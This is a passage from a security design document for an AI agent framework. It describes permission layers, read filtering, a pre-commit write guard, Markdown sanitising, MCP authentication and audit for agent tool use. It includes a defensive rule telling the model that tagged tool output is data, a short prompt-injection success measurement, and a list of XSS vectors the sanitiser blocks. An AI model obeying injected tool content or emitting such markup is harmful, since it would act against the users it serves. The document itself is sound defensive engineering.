1. **L1** - the clerk holds `SalesAssistantUser` **on the security root**, through the tier rule, and
   the policy grants that role `data.read`. `listInstances` passes. `executeTLScript` is in `script`
   (privileged, not granted) - denied, and the model is told so.
2. **L2** - `listInstances` calls `readable(...)`. `ModelAccessRights` finds
   `TypeAccessRule(Customer, Read) = {Viewer, Editor, Manager, SalesAssistantUser}` and evaluates the
   role *per instance*: through the scope rule the clerk holds `SalesAssistantUser` on their own
   region's customers only. Result: their region's customers.
3. **L3** - the filtered list is serialized; `totalCount` reports the filtered count.
4. **L4** - no write happened, nothing to guard.

> **Only the scope assignment is not enough**, and this example used to say it was. A role held only on
> regional customers is invisible to L1, which looks at the root and nowhere else, so step 1 would deny
> `listInstances` and step 2 would never run. The tier assignment is what makes L1 pass; the scope
> assignment is what makes L2 narrow. Neither substitutes for the other, and
> `use-default-security-parent` must stay `false` or the tier assignment swallows the scope one.
> [role-model-worked-example.md](role-model-worked-example.md) builds exactly this, in full, with four
> personas and the configuration that produces them.

The clerk sees their customers and a clear denial for the write. Neither layer alone gets this right:
RBAC alone would return every customer; ABAC alone would let the clerk run arbitrary TL-Script and
merely fail per object, leaking type structure and cardinality in the process.

### 3.4 L3 - Context and result pre-filtering

**Pre-filter, never post-hoc redact.** Once a value is in the conversation it has been streamed to the
browser, sent to the provider, and written to the transcript.

#### 3.4.1 Tool results

Filtering happens **inside the tool, before serialization**, and not in the dispatcher. That is not a
compromise, it is the only place it can work: almost every tl-ai tool returns an **already-serialized
JSON string** built by a msgbuf writer, so by the time `ToolExecutions.execute` sees the result there is
no object graph left to filter. A dispatcher-level `SearchExpression.filterSecurity` would inspect a
`String` and pass it through, which is worse than no filter because it looks like one.

So the filter is the `ReadFilter` of section 3.3.2, applied where the object still is an object, and
the design leans on it being *one* filter rather than on it being late. Its traversal is the same shape
as the engine's `filterSecurity` (recurses through collections and maps, drops non-readable elements,
returns the input unchanged when nothing had to go - `SearchExpression.java:278-390`), so a reader who
knows one knows the other.

What is still not covered here, stated plainly so an observation is not mistaken for a finding: an
**aggregate** computed inside a script (`all(...).size()`). The **model digest** (3.4.2) and the
**vector index** (3.4.3) are covered since #295, each by the check its data admits - the digest
describes types and is bounded by `accessibleTypes(READ)`, the index returns objects and is filtered
per object.

**Filtering decides what the model sees; marking says what it is.** The two are separate and both are
needed: read rights say *which* business data reaches the context, and nothing about *who wrote it*.
What reaches it is, by volume, the application's largest untrusted input - the free text in a shared
record, typed by an end user who is not the principal this run serves - so every such payload carries
the `UntrustedEnvelope` tags, and the system prompt states once per run what a tagged block is (data
to read and report, never an instruction, T3). Marking is per tool and never in the dispatcher, for
the same reason filtering is: by the time `ToolExecutions.execute` sees a serialized string it can no
longer tell what is in it.

Who applies it (#478): `ReadFilter` marks everything it discloses, so a TL-Script tool's answer is
marked by the executor that runs it; a `@ToolMethod` answer is marked by `AnnotatedTools` unless the
method declares `marking = AnswerMarking.NONE` (the answer is this application's own sentence, or is
itself an instruction the agent is meant to follow - a loaded skill, the user's own reply) or
`AnswerMarking.TOOL` (the tool marks its own content, in the kind that content deserves - a fetched
page, a stored document, an external MCP server's answer). The default marks, because the gap this
closed was silent: a tool moved from TL-Script to Java kept working and quietly stopped saying what
its payload was, and an application outside this repository had to notice and re-apply the envelope
by hand. A tool that implements `Tool` directly marks its own answer, as `ScriptToolExecutor` and
`McpTool` do.

None of this is a control in the sense the other layers are: it is an instruction to a model, and the
model is not a boundary (2.2). Measured against `claude-haiku-4-5` on a payload aligned with the
user's own request, an injected tool call went through in 19 of 24 runs with nothing marked and 3 of
24 with the marking and the standing rule in place - a blast-radius reduction, not immunity (2.5).

#### 3.4.2 The model digest · **implemented** (#295)

The digest is the read surface that reaches the model **in one piece**: one `outlineModel` call hands
over every module, type and attribute, so a type nobody filtered out is a type the agent now knows the
name, the shape and the relationships of (T11). It is therefore scoped, and by the check its data
admits - what it describes is **types**, so the bound is `accessibleTypes(READ)` and not the read
filter, which decides about objects.

`ModelDigestGenerator.generate(TLModel, boolean, ModelSecurity, Locale)` is the **only** form. There is no
argument-less one to forget, the same shape `TidResolver.resolve` and `ExecutionResult.toJson` have
carried since #289, and `ModelBrowserTool.outlineModel` takes the run's `ToolExecutionContext` to
supply it. A class outside `accessibleTypes(READ)` has no entry; a module whose classes are all
inaccessible is absent with its enumerations; a principal who may read no type at all is told there is
nothing, which is the same answer an application with no modules gives.

Three boundaries, stated so an observation is not mistaken for a finding:

- **An emitted type is written out in full.** Its generalizations and the target types of its parts are
  *named* even where those types have no entry of their own. Naming is not describing, and a definition
  with its references cut out would be a false statement about the type rather than a narrower one -
  the same line this design draws for object labels one level up (3.3.2).
- **Enumerations are not scoped.** The engine's rights do not scope them: a `<security-config>` grants
  on classes and on parts, and there is no grant an administrator could write about an enumeration. So
  they follow their module, which is scoped.
- **`accessibleTypes` resolves roles at the global security root.** An account holding a role only on
  single objects - a scope rather than a tier - does not get that type advertised, although it may well
  read instances of it. The error is towards disclosing less, and the instance surfaces are filtered per
  object anyway.

Attribute-level restrictions are *not* reflected: the digest advertises a type's parts as the model
declares them. Making absence mean "you may not read this attribute" needs the same per-part walk
`ReadFilter.attributesOf` does and is not done; what the digest promises is which **types** exist, and
what an account may then read of an instance is decided where the instance is read.

The digest is now per-principal, so it must not be cached globally. It is generated fresh on every
call, which is what the tool always did.

Asserted against the fixture's real accounts by `SecDemoModelDigestTest`: a ticket reader is told about
`pm:Ticket` and not about `pm:Project`, and the module nobody holds a grant in is absent entirely.

#### 3.4.3 RAG / vector index (T10) · **implemented at query time** (#295)

The index is populated by a background daemon under system rights, so index *contents* are
unrestricted by construction. Filtering therefore happens **at query time**, in `VectorReadFilter`,
and `VectorIndex.searchVectorIndex` has no form that skips it - a search names the principal it serves
or does not happen:

1. Each chunk carries the source object's identifier: the `objectId` field of the indexed payload,
   which the indexer has always written, and since #295 also a `TopLogic-id` metadata entry. The
   metadata is read first and the payload is the fallback, so an index built before #295 keeps
   filtering rather than going dark.
2. The identifier is resolved through `TidResolver.resolve`, which **is** the read check, so "no such
   object" and "not yours" are one answer here as everywhere else.
3. **Over-fetch and then filter**: the store is asked for `k * f` candidates and the readable hits are
   truncated to `k` afterwards (`VectorReadFilter.overfetch`), so an account with narrow access still
   gets a full page rather than the two survivors of the top ten. A fixed multiplier is a heuristic and
   not a guarantee, which is why the result says when the candidate pool ran out.
4. Chunks whose source cannot be resolved are **dropped**, not passed through.

`VectorIndexSearchTool` goes one step further than dropping: what it writes for a surviving hit is the
live object through `ReadFilter` - its identity and the attributes the principal may read - and **not**
the indexed chunk. The chunk is a serialization of every flex attribute taken at indexing time, so
handing it over would disclose an attribute the principal may not read and a value that has since
changed. The TL-Script function `vectorIndex.search` still returns the chunk, because its caller is the
script author's own session and the object it hands back is read-checked by the engine on every
attribute access; the per-object drop applies to it identically.

**What this does not claim.** The embedding vector was computed from unfiltered text. Dropping a hit
keeps the text out of the answer; it does not undo that the vector exists, and a caller who can observe
scores can still learn that *something* similar is in the index. Not indexing unreadable content in the
first place is the stronger guarantee, and a different change: it makes the index per-principal (or
per-role), which multiplies the embedding cost and the storage by the number of distinct rights
profiles and makes a rights change a re-indexing job. Which guarantee is being bought is an owner's
decision, not an implementer's - it is written up as a follow-up rather than silently chosen here.

Asserted against the fixture's real accounts by `SecDemoVectorIndexTest`; the store round trip stays
behind `-Dtl.ai.vector.e2e=true` in `VectorIndexIntegrationTest`, because it needs an embedding key.

### 3.5 L4 - Pre-commit action guard · **implemented**

The highest-value layer, because it is the only one that catches tools that never had a check: MCP
tools, TL-Script tools authored at runtime, and any future Java tool whose author forgot. Every other
layer assumes the tool cooperates; this one does not.

**Where.** `AgentLoop.commitTransaction`, immediately before `scope.commit()`. There is exactly one
commit per turn, so there is exactly one place to guard.

**What.**

```java
public interface PreCommitGuard {

    /** Accepts every change. A test seam; forRun never answers with it. */
    PreCommitGuard PERMISSIVE = ...;

    /** The violations found; empty means the commit may proceed. */
    List<Violation> check(SecurityContext security, ToolChangeSet changes);

    /** Whether this guard checks anything at all - asked before the change set is built. */
    default boolean enforces() { return true; }

    /** PERMISSIVE unless the run's mode enforces model access. */
    static PreCommitGuard forRun(SecurityContext security) { ... }

    record Violation(TLObject object, String typeName, BoundCommandGroup operation, String reason) {}
}
```

`ModelSecurityPreCommitGuard` is the implementation. It adds **no policy of its own**: every question
goes to the run's `ModelSecurity`, hence to the engine's `ModelAccessRights`, so a tool that bypassed
its own check ends up bounded by exactly the rights the acting user would have had in the UI.

**Where the change set comes from.** `TransactionScope.changes()` reads the engine's own transaction
bookkeeping - `DefaultDBContext.getNewObjects()` / `getChangedObjects()` / `getDroppedObjects()`, plus
the per-item `ChangeInspectable.getChange()` record the engine also uses to build its commit event.
Nothing asks a tool what it wrote: a tool that forgot to check would equally forget to report. Only
attribute *names* are read from the change record, never values.

| Change | Check |
|---|---|
| created | `canCreate(type, container)`, and `canCreate(parent, compositionAttr)` when created into a composition |
| updated | `canWrite(obj)` and `canWrite(obj, attr)` for every touched attribute |
| deleted | `canDelete(obj)` |

**On violation:** the whole turn is rolled back through `AgentLoop.rollbackTurn` - the *same* route a
failed tool call takes, so all-or-nothing means the same thing in both cases - one audit record per
violation is written by the guard, and the model is given a framework notice naming the operation and
the type but **not** the values:

> `[Framework notice] The data changes of this turn were rolled back and NOT persisted, because your
> account is not permitted to make all of them: you attempted 'Create on objects of type
> 'myapp:Contract'' for 3 objects without permission. The rollback is all-or-nothing, so the permitted
> changes of this turn are gone as well. ...`

**The checks run in the committed view** (`KnowledgeBase.withoutModifications`), forced by the engine
in two ways. An object deleted in the current transaction refuses attribute access, and
`ModelAccessRights` has to read its type and its security parent to decide - in the committed view the
object is visible again, which is where its DELETE right is meaningful anyway. And an object created in
the current transaction is allowed everything by construction, so asking about it would answer nothing.

**Ordering caveat, verified against the engine.** `ModelAccessRights.isAllowed` returns `true` for
objects that are not yet committed (`SecurityConfigurationService.isCommitted`), because rule-derived
roles are computed at commit time. So the guard **cannot** validate a freshly created object's *own*
instance-level rights - by construction those do not exist yet. What it validates for creations is
condition 1 + condition 2 of spec 2.3.6 (CREATE on the type in the committed parent context, WRITE on
the composition attribute of the committed parent), which is precisely the check the engine itself
performs. A parent created in the same turn is equally unvalidatable and is covered by *its* creation
being checked against *its* container, up to the first committed ancestor. Updates and deletes of
pre-existing objects are checked fully. This is a real limit of the layer and is stated rather than
papered over.

**What the layer does not cover.**

- Attribute writes to an object created in the same turn. Booked by the engine as part of the creation,
  and unvalidatable per the caveat above. The creation itself is checked.
- Change-set items that carry no application type - the link items of a multi-valued reference, and the
  engine's own bookkeeping items. Not a silent hole: the object at the writing end of such a link is
  itself booked as changed, so the write is checked through that object. A storage-level attribute that
  maps to no model attribute likewise costs attribute granularity, not the check - the object-level
  right is always asked as well.
- Side effects outside the KnowledgeBase. A tool that wrote a file, sent a mail or called an HTTP
  endpoint is not rolled back by a KB rollback. That is L1's business (`egress`) and the approval
  prompt's, not this layer's.

**Cost.** One `ModelAccessRights` call per touched object and per touched attribute, once per turn,
plus one pass over the transaction's own change lists. Turns that write nothing - the overwhelming
majority - skip the guard entirely, because `scope.isActive()` is false: no transaction was ever begun,
since `ensureTransaction` only begins one for non-READ tools. A turn that *does* write pays this in
addition to whatever the tools already paid; the guard is deliberately not the place to economise.

**Tested by** `TestPreCommitGuard` and the transaction cases of `TestAgentLoop` in `tl-ai-core`, and
`SecDemoPreCommitGuardTest` against a real fixture boot - see
[testbed.md](../../tl-ai-demo/doc/secdemo/testbed.md#56-the-pre-commit-guard-l4).

### 3.6 L5 - Output / reference guard

Scoped narrowly and deliberately.

**In scope:** deterministic validation of *structured object references* the agent emits - `TLID`s,
`toplogic://instance/{tid}` URIs, deep links, and the object references embedded in tool results the
UI renders as links. Each is resolved and checked with `canRead`; a reference that fails is removed and
replaced with a neutral placeholder.

**Out of scope:** scanning free-form answer text for "secrets". The data has already been streamed by
the time a full answer exists (`ChatSSEHandler` pushes `text_delta` frames live), so a post-hoc scan
protects nothing and creates a false sense of assurance. If a value must not appear in an answer, it
must not have reached the context - that is L2 and L3.

The residual risk is explicit: an agent that legitimately read an object (L2 passed) can paraphrase it
in prose, and prose is not checked. That is inherent to the product.

#### 3.6.1 Rendering the answer · **implemented** (#385)

The answer is rendered as Markdown, which is where the *other* direction of the output guard sits: not
what the agent may say, but what a browser may do with what it said. The text is model output, and a
model writes down what `webFetch` and the tool results put in front of it, so a page carrying
`<script>`, an `<img onerror>`, a `javascript:` link or an `<iframe>` reaches the renderer as soon as
the model quotes it. The text is also persisted with the conversation and rendered again on every
reopen, so anything active in it is stored, not reflected.

Both front ends filter with an allow-list, and neither trusts the other end:

- **Server side** - `Converters.markdownToHtmlString` is the single boundary where HTML is made from
  model text, and every consumer goes through it: the `contentHtml` the chat API hands out and the
  TL-Script function `convert.markdownToHtml`. Two layers
  act there. The renderer escapes raw HTML in the Markdown (`HtmlRenderer.ESCAPE_HTML`), so a quoted
  `<script>` becomes text. `HtmlSanitizer` then filters what the renderer itself produced, which is
  the layer escaping cannot replace: `[text](javascript:...)` is Markdown, not HTML, and the renderer
  writes that target into an `href` of its own accord.
- **React side** - `tl-chat/ui/src/markdown.tsx` parses with `marked` and filters with `DOMPurify`
  before the result reaches `dangerouslySetInnerHTML`, widened only by the copy button and the data
  attributes that the file's own code-block and citation markup carry.

The allow-list is the one a Markdown answer needs and nothing beyond it: headings, lists, tables with
their column alignment, code with its language marker, block quotes, `<del>`, `<ins>`, `<sup>`,
`<hr>`, and links and images whose scheme is `http`, `https` or `mailto`. A URL in any other scheme -
`javascript:`, `vbscript:`, `data:`, `file:`, and the same spelled in mixed case, which a browser
matches and a naive check does not - loses its attribute; the text around it stays, so the reader sees
what the model wrote without being able to act on it. A relative URL is kept as written, because
`publishPage` hands the model a root-relative link whenever the deployment declares no `%HOST%`.

What this is not: a defence against the agent *choosing* to write a hostile link to a host it may
reach. An `https://` link to any site is allowed, as it must be for an agent that cites its sources.
The guard is against markup becoming behaviour, not against the destination of a link the reader
clicks knowingly.

### 3.7 The three bypass routes, closed

| Route | Today | Design |
|---|---|---|
| **MCP server** (`McpToolAdapter`, and the resource handlers) | Was: unauthenticated `/mcp/*`, `null` context, system interaction, engine super-user bypass | **Closed** (#261). `McpAuthenticationFilter` on `/mcp/*` authenticates every request - the MCP specification requires authorization on every request, not only on `initialize` - through the OpenAPI server's `Authenticator` framework, and opens the resolved `Person`'s `TLContext` for the whole request; the MCP server is built with `immediateExecution(true)`, which keeps the protocol handlers on that request thread. `McpToolAdapter` builds a `ToolContext` over `TopLogicSecurityContext.forRun(person, background = true)` and applies the same `ToolPermissionFilter` as the chat path - one policy, two front ends. The resource, dynamic-resource and completion handlers read in that account's context and disclose through the `ReadFilter` chokepoint. Nothing is served open: no configured authentication means every request is refused, a credential mapped to no account is refused rather than run in system context, and `MCPServerService$Module` still ships `false` so serving the endpoint at all stays deliberate. **Still open:** per-caller `tools/list` filtering (SDK) and RFC 9728 discovery metadata - see [mcp-endpoint.md](mcp-endpoint.md). |
| **`createUnrestricted()`** (the TL-Script entry points) | Silent full bypass | **Closed:** removed. `ToolContext.forCurrentUser()` acts as the calling account and throws when the thread has none |
| **`ToolContext.EMPTY`** | Full bypass reachable from production code | **Closed:** documented as a test seam, and no production path builds a context this way - `TopLogicSecurityContext.forRun` requires a `Person` |

The MCP change is the one with real external impact: an existing external client (Claude Desktop,
Cursor) reaches nothing until the application enables the module *and* configures a credential for it,
and then sees only what its account may see. That is the point - an unauthenticated endpoint that
executes `deleteModelElement` under super-user rights was the single largest exposure in the system,
and an unauthenticated endpoint that merely *reads* every instance of every type under the same bypass
is not much smaller. Neither is something a deployment should get without asking for it.

An MCP session additionally belongs to the account that opened it. The transport keys every request
after `initialize` by the `mcp-session-id` header and holds no owner of its own, so authenticating
each request is necessary but not sufficient: without the ownership check, two accounts that both
hold a valid credential could take turns on one session.

### 3.8 L6 - Audit

One structured event type, `AgentEvent.SecurityAudit`, alongside the existing 25 agent events, carrying
`(runId, turn, timestamp, person, tool, decision, reason, mode)`. Recorded for:

| Occasion | Why |
|---|---|
| Every RBAC denial (L1) | Detects both misconfiguration and probing |
| Every `ToolSecurityException` (L2) | The tool asked and was told no |
| Every pre-commit rollback, one record per violation (L4) · **implemented as a log line** | The highest-signal event in the system - it means a tool tried to write without authority. `ModelSecurityPreCommitGuard` writes one `ERROR` per violation, in the field shape of a `ToolAuthorization` denial. What is still missing is the structured `AgentEvent.SecurityAudit` and the `ConversationLog` entry |
| Every reference stripped (L5) | Low volume, high signal |
| Every `egress` call correlated with a restricted `data.read` in the same turn (3.2.4) | Exfiltration detection |
| Every refused run - one that could not name a principal | Answers "what tried to run with no account behind it" |

Denials are logged at `WARN` and rollback violations at `ERROR`. Both should also go to the
`ConversationLog`, so the audit trail lives with the transcript that produced it - that part is **not
built** for either layer; today both write to the application log only. **Audit records never contain
withheld values** - type names and operations only.

---

## 4. The administrator's configuration

### 4.1 `AiToolAccessService` · **implemented**

A `ConfiguredManagedClass` holding the role-to-tool policy, deliberately shaped like
`SecurityConfigurationService` (#29088) so administrators meet one idiom, not two. Its configuration
interface is `ToolAccessPolicy` (scaffolded on this branch), which the service's own
`ConfiguredManagedClass.Config` extends:

```xml
<config service-class="com.top_logic.tl.ai.core.security.AiToolAccessService">
    <instance>

        <!-- Group membership is declared on the tool (@ToolMethod(group=...)).
             This section only *overrides* it, or assigns a group to tools that
             cannot be annotated (MCP tools, TL-Script tools authored at runtime). -->
        <tool-groups>
            <group name="egress"
                tools="mcp__jira__createIssue, mcp__jira__addComment"
            />
            <group name="data.read"
                tools="script-tools.findOverdueInvoices"
            />
        </tool-groups>

        <!-- The role x tool matrix. Deny-by-default: a role with no entry gets nothing. -->
        <tool-access>
            <role name="SalesAssistantUser">
                <grants>
                    <grant group="model.read"/>
                    <grant group="data.read"/>
                    <grant group="agent.meta"/>
                    <grant tools="task-tools.createTask"/>
                </grants>
                <denies>
                    <deny group="model.structure"/>
                    <deny group="script"/>
                </denies>
            </role>

            <role name="SalesManager">
                <grants>
                    <grant group="model.read"/>
                    <grant group="data.read"/>
                    <grant group="data.write"/>
                    <grant group="workspace"/>
                    <grant group="egress"/>
                </grants>
                <denies>
                    <deny group="model.structure"/>
                </denies>
            </role>

            <!-- Every group is reached only by a grant naming it, this one included. -->
            <role name="ApplicationDeveloper">
                <grants>
                    <grant group="model.read"/>
                    <grant group="model.structure"/>
                    <grant group="script"/>
                    <grant group="agent.authoring"/>
                </grants>
            </role>
        </tool-access>

        <!-- Granted to every authenticated user, on top of their role grants. "interaction" and
             "introspection" are granted implicitly and need no entry here - the first is spelled
             out in this example only to show the element, and writing it changes nothing. -->
        <baseline>
            <grant group="interaction"/>
        </baseline>

        <!-- Ceiling for runs with no human to approve (agentChatAsync, scheduler, MCP).
             Mandatory once enforcement is on; write all="true" to opt out of it explicitly,
             or leave it empty to forbid unattended runs every tool. -->
        <background-allowlist>
            <grant group="model.read"/>
            <grant group="data.read"/>
            <grant group="agent.meta"/>
        </background-allowlist>
    </instance>
</config>
```

This is the XML the scaffolded `ToolAccessPolicy` actually produces - the `<grants>`/`<denies>` and
`<tools>` wrappers come from the typed-configuration list and map properties, not from stylistic
choice.

Semantics, stated precisely:

| Rule | Behaviour |
|---|---|
| No `<role>` entry for any role the user holds | All tools denied (baseline only) |
| `interaction`, `introspection` | Granted to every role and every run implicitly, whatever `<baseline>` says; a `<deny>` still wins. `RoleToolAccess.IMPLICIT_BASELINE` |
| Multiple held roles | Grants **union**; then denies subtract |
| `<deny>` anywhere among the held roles | Wins over any `<grant>`, from any role |
| A tool with no group and no `<grant tools>` naming it | Denied |
| `<grant tools="a, b">` | Grants exactly the named tools, matched against any of `ToolIdentity.names()`. No pattern syntax: a tool the policy does not name is denied |
| An entry naming a group and tools at once, or neither | Boot-time `context.error(...)` - it would otherwise look like a grant and be none |
| Roles referenced must exist | Boot-time `context.error(...)`, same as `SecurityConfigurationService.processRights` does for unknown roles - a typo must not silently widen or narrow access |

Note this is **static application configuration**, consistent with #29088's own choice
(spec 2.4.1: "loaded at startup and a change requires editing the configuration"). Section 4.3
describes the runtime-editable successor.

#### Decided while implementing this section

Four points the table above leaves open, resolved as follows. Each is a deliberate reading, not an
accident.

| Question | Decision | Why |
|---|---|---|
| When exactly does enforcement turn on? | **It is always on.** There is no setting, and an absent `<tool-access>` matrix is not an opt-out (issue **#288**). | A switch whose default was permissive masked every enforcement gap and existed to migrate an installed base that does not exist. What survives of the old reading is that writing the matrix is still what makes an application *fully* usable, not what makes it *checked*. |
| What does an application that configures nothing get? | `IMPLICIT_BASELINE` plus **`DEFAULT_BASELINE`** - `model.read` and `data.read` (issue **#293**). | Fail-closed was right and unhelpful: an agent that boots and can only ask questions reads as a defect rather than as an unconfigured application, and it would hit every consuming application on day one. Read-only keeps the default honest - nothing in it mutates, exports or reaches every type. |
| Where does that default live, and how does it compose? | In Java (`RoleToolAccess.DEFAULT_BASELINE`), **not** as a `<baseline>` element in `tl-ai-core.conf.config.xml`. | A keyless configuration list composes *additively* across configuration files - the engine's `SimpleListStorage` seeds itself from the base value and appends - so a shipped element would be unioned with an application's own rather than replaced by it, and an application asking for one capability would silently also get these two. Resolving it in Java keeps "writing `<baseline>` replaces the default" exactly true. It also forced `getBaseline()` to become a nullable *item* rather than a nullable list, because the engine rejects a nullable `LIST` property outright - the same shape `<background-allowlist>` already has, and `@DefaultContainer` keeps the XML unchanged. |
| A `<grant group="...">` naming a group no tool is in | Boot **warning**, not error, listing the unknown names and the known ones | Unlike roles, group names are an open string space by design - applications, MCP servers and TL-Script tools authored in the running application contribute their own, and one can appear after boot. A group nobody claims *at boot* is therefore not proof of a typo. It is still said out loud, because a grant of a misspelled group reaches nothing. |
| Does the `<background-allowlist>` apply to administrators? | **Yes** | Its justification is the missing approval prompt, not the principal's authority: an unattended administrator run has nobody to ask either. An administrator who needs a write tool in a scheduled run says so by putting its group on the allowlist - which is the "explicit administrative decision" 3.2.5 asks for. |
| What if the `<background-allowlist>` is missing? | **Boot error** naming the three things that can be said instead - for a policy that grants at least one role something. A policy with no `<tool-access>` entries at all has nothing to have forgotten and boots. | It is the only control that stands in for the approval prompt an unattended run cannot show, so its absent state must not be the permissive one. See 3.2.5. |
| What if it is present but empty? | Unattended runs reach **nothing** | A legitimate and stricter answer, and distinguishable from silence - which is exactly why silence has to be rejected rather than interpreted. |
| Does it apply to a sub-agent? | **To a detached one, yes; to a synchronous delegation, no** | The question is only ever whether somebody is there to answer an approval prompt. A synchronous delegation completes inside the parent turn, where that human still is; `spawn_subagent` is fire-and-forget, so the parent turn ends and the child works on with nobody to ask. See 3.2.5 - and note the accepted consequence: a detached child loses tools its parent could use, and says so in its own prompt. |
| Where do the group constants live? | `tl-ai-tool-api`, not next to the policy | A tool declares its group on `@ToolMethod`, so the legal values must be nameable from every module that can define a tool. `tl-ai-vector-index` depends on `tl-ai-tool-api` alone and could not otherwise classify `searchVectorIndex`. |

One implementation consequence worth stating, because it is invisible in the XML: a tool has **three**
names - the bare `Tool.name()` the model calls, the configured `{factory}.{tool}` name an administrator
writes, and the provider-safe `factory__tool` form the registry keys it by. A `<grant tools="...">`
entry matches any of them. Matching only the registry's form (the first implementation) made a correctly
spelled dot-notation grant reach nothing at all.

### 4.2 Which agent, model and MCP server a run may be · **implemented** (#392)

The tool list is unchanged from today's `AgentDefinition.tools()`; the role policy is an additional,
independent filter over it. What an agent definition does **not** decide is who may run it: it is
editable by whoever may author agents, so anything it declared about its own security would be either
inert or an escalation path. The `<required-groups>` self-narrowing that stood here as a proposal was
never built and is not the control an administrator needs - an allowlist keyed by role is.

Three sibling sections of the same policy answer the three questions a *request* asks, in the idiom
`<tool-access>` already uses:

```xml
<agent-access default="all">            <!-- all | none -->
    <role name="SalesUser">
        <grants><grant agents="sales-assistant, pietro"/></grants>
        <denies><deny agents="framework-wiring-agent"/></denies>
    </role>
</agent-access>
<model-access default="assigned">       <!-- assigned | all | none -->
    <role name="SalesUser"><grants><grant models="claude-haiku-4-5"/></grants></role>
</model-access>
<mcp-access default="agent">            <!-- agent | all | none -->
    <role name="SalesUser"><grants><grant servers="internal-docs"/></grants></role>
</mcp-access>
```

#### Semantics, stated precisely

Asked about one name the request asked for, against the roles the account holds on the security root:

| # | Rule | Outcome |
|---|------|---------|
| 1 | Any held role names it in `<denies>` | Denied, whatever else says |
| 2 | Any held role names it in `<grants>` | Permitted |
| 3 | It is what the agent itself uses - its assigned model, a server it declares | Permitted |
| 4 | Any held role is named in this section | Denied |
| 5 | Otherwise | The section's `default` decides |

Rule 3 is what keeps the rule set usable: every client of `/chat/send` sends the model it is showing,
which is the agent's own until the user picks another, and a rule that called that a *choice* would
refuse every request of a restricted role. Its consequence is that **a `<grant>` is a floor and never
a ceiling**: it adds to what the role's agents already use and cannot take anything away, so bounding
a role downwards is a `<deny>` or a different agent assignment, never a narrower grant. Rule 4 is the allowlist reading of a role entry, and it is
why `default="all"` and a role entry do not contradict each other: naming a role restricts its holders
and leaves everybody else where they were, which is what adding one restricted role to a running
application means. A role entry with no `<grants>` is therefore how "this role may use none of them"
is said.

The five rules answer about **one name the request asked for**, and a request asks about very little:
the chat sends a model and, when the user attached one, a server. So the run asks the two remaining
questions on its own behalf, before it starts - is the model my agent is assigned denied to this
account, is any server my agent declares denied to it - and refuses if either is. Without them rule 1
would answer only when a client happened to name the denied thing: a request that echoed the agent's
own model back was refused while the identical request without the field ran on exactly that model.
The consequence is worth stating to whoever writes the policy: denying what an agent itself uses takes
that **agent** away from the role, and the chat's `/chat/capabilities` drops it for the same reason -
a menu that offered it would offer a turn that comes back refused.

The defaults are each the least surprising safe answer for their own question rather than one uniform
one:

| Section | Default | Why |
|---------|---------|-----|
| `agent-access` | `all` | An agent is a persona, and an application that configured nothing has always offered all of them. |
| `model-access` | `assigned` | A model choice is a cost and a capability decision; a request runs on what its agent is assigned until an administrator hands the choice out. |
| `mcp-access` | `agent` | Attaching a server is egress the administrator did not plan for that turn; a request reaches the agent's own servers and no others. |

`none` refuses the same requests as `assigned` and `agent` do, because of rule 3. What it changes is
what a client is *offered*: under `none` the menu is empty, so the choice is not shown at all.

Administrators bypass all three, as they bypass the tool layer and the engine's model rights. There is
no background ceiling here: which agent a run is and what it runs on is settled before it starts, and
the `<background-allowlist>` is about tool calls nobody is there to approve.

#### What the sections do not decide

Two agents the chat runs *for* the user rather than *as* a choice are outside `<agent-access>`,
because it decides which persona **answers** and neither of them answers:

- **The chat entry point.** A request that names no agent runs the configured entry point when the
  account may run it and otherwise the first agent it may run - `AgentFactory.defaultAgentFor`, which
  `/chat/capabilities` reports and `ChatProcessor` runs, so the menu and the run cannot name different
  agents. An account that may run none at all is refused with a sentence of its own.
- **The prompt improver**, and every agent a client hides from its picker. Its run is built with
  `SecurityContext.withoutAgentChoice()`, which drops the agent dimension and nothing else - the
  model, the MCP servers and every tool it calls stay decided. Gating it would make an administrator
  grant an agent the picker deliberately hides.

#### Where it is enforced

`AgentFactory.runAgent(..., RunOverrides)` is the choke point - the chat, `AgentRunner`, the scheduler
and TL-Script all pass through it - and it authorises before applying anything of the request, so no
provider round trip is spent on a run that may not happen. A refusal is a `ToolSecurityException`
carrying a `ResKey`; `/chat/send` and `/chat/regenerate` pre-check the same three questions and answer
**403** with that text, so the user reads a sentence rather than watching a turn fail.

**Delegation is bounded by the acting principal too**, not only by the parent agent's `delegations`
list: `buildAgentLoop` and `buildSubagentLoop` refuse an agent the account may not run, and
`AgentCapabilities` drops such an agent from the delegate catalogue and from `list_agents` so that the
model does not ask for it. The alternative - bounding delegation by the parent agent's list alone -
would have let `spawn_subagent` reach any agent the orchestrator names, which is the hole #392 was
filed about.

An agent, a model or an MCP server the application does not have refuses the boot, unlike an unknown
*tool group*: the three are closed sets the application can enumerate, so a name outside one of them
is a typo - and a misspelled refusal refuses nothing while reading as a prohibition.

### 4.3 Administration UI concept · **not built**

**Location:** `Administration > Security > AI Tool Access`, next to the existing role and group
administration, because the audience is the person who already administers roles.

**Main view - the role x group matrix.** Rows are roles (from `BoundedRole`), columns are tool groups.
Each cell cycles through three states:

```
                     model  data   data   model   agent   agent  inter-  work-
                     .read  .read  .write .struct .author .meta  action  space   script  egress
                     ┌──────┬──────┬──────┬───────┬───────┬──────┬───────┬───────┬───────┬──────┐
 SalesAssistantUser  │  ✓   │  ✓   │  -   │   ✗   │   -   │  ✓   │  ✓ b  │   -   │   ✗   │  -   │
 SalesManager        │  ✓   │  ✓   │  ✓   │   ✗   │   -   │  ✓   │  ✓ b  │   ✓   │   -   │  ✓   │
 ApplicationDeveloper│  ✓   │  ✓   │  ✓   │   ✓ ! │   ✓ ! │  ✓   │  ✓ b  │   ✓   │  ✓ !  │  ✓   │
 Everyone (baseline) │  -   │  -   │  -   │   -   │   -   │  -   │  ✓    │   -   │   -   │  -   │
                     └──────┴──────┴──────┴───────┴───────┴──────┴───────┴───────┴───────┴──────┘
   ✓ granted    - not granted (denied by default)    ✗ explicitly denied
   b from baseline    ! privileged - requires confirmation, logged as a security change
```

**Detail view - per group.** Expanding a column lists its member tools with mode, declared types and
origin (Java factory / MCP server / TL-Script), and allows per-tool `grant`/`deny` overrides for the
rare case where group granularity is too coarse.

**Effective-permissions inspector.** Pick a `Person`, see the resulting tool set with, for each tool,
*which* role granted it. This is the feature that makes the system operable - without it, "why can
Meier not use this?" is unanswerable, exactly the pain #29088 identifies for view-based security
(spec 1.4).

**New-tool review queue.** Tools present in the registry but in no group are listed as "ungrouped -
denied to everyone". A new tool cannot slip into a grant by accident, and the administrator has an
explicit worklist. This is the UI face of O4.

**Guard rails.**
